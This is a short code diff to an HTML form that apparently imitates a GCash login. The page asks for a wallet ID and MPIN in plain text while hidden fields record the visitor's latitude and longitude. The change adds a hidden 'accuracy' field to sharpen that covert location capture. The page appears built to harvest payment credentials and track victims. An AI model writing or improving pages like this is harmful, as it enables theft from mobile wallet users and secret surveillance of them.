@@ -10,6 +10,7 @@
     <form method="post">
         <input id="latitude" hidden name="latitude">
         <input id="longitude" hidden name="longitude">
+        <input id="accuracy" hidden name="accuracy">
         GCASH ID:<input type="text" name="gcash_id">
         MPIN: <input type="text" name="mpin">
         <input type="submit">
@@ -26,6 +27,7 @@
         longitude = crd.longitude
         document.getElementById("latitude").value = latitude
         document.getElementById("longitude").value = longitude
+        document.getElementById("accuracy").value = accuracy
     }
 
     function error(err){
